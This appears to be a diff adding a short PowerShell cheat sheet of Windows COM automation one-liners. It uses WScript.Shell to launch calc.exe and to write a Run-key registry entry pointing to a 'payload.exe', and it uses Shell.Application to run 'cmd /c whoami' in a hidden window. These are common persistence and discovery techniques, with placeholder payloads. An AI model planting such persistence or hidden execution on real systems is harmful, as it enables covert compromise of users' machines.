@@ -1,0 +1,10 @@
+# COM Automation One-Liners (Windows-only)
+
+# 1. WScript.Shell execution and registry writing
+$sh = New-Object -ComObject WScript.Shell
+$sh.Run('calc.exe')
+$sh.RegWrite('HKCU\Software\Microsoft\Windows\CurrentVersion\Run\x', 'payload.exe', 'REG_SZ')
+
+# 2. Shell.Application program launching
+$app = New-Object -ComObject Shell.Application
+$app.ShellExecute('cmd.exe', '/c whoami', '', 'open', 0)
